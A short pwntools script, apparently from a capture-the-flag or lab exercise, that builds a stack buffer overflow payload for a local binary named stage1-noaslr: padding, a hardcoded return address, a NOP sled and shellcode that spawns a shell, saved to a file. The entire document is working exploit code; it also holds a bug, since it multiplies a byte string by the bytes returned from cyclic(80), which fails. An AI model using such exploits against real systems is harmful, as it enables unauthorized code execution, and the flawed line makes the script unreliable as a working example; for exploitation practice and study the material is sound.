from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.aslr = False
context.log_level = 'error'

io = process('/home/stage1/stage1-noaslr')

offset = cyclic(80)
addr = p64(0x7fffffffe3b0)
junk = b'A' * offset
payload = junk + addr + (b'\x90' * 400) + asm(shellcraft.sh())

file = open('payaslr', 'wb')
file.write(payload)
file.close()

# io.sendline(payload)
# io.interactive()
